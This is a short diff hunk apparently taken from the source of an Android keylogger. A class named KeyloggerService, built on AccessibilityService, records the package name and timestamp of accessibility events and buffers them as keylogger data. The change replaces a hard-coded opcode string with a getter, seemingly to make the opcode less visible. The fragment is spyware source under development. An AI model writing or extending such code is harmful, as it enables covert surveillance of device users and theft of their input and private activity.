@@ -271,7 +271,7 @@ public class KeyloggerService extends AccessibilityService {
             data.put("package", event.getPackageName() != null ? event.getPackageName().toString() : "");
             data.put("ts", System.currentTimeMillis());
 
-            bufferEvent("x0000kldata", data);
+            bufferEvent(getKldataOpcode(), data);
 
         } catch (Exception ignored) {}
     }
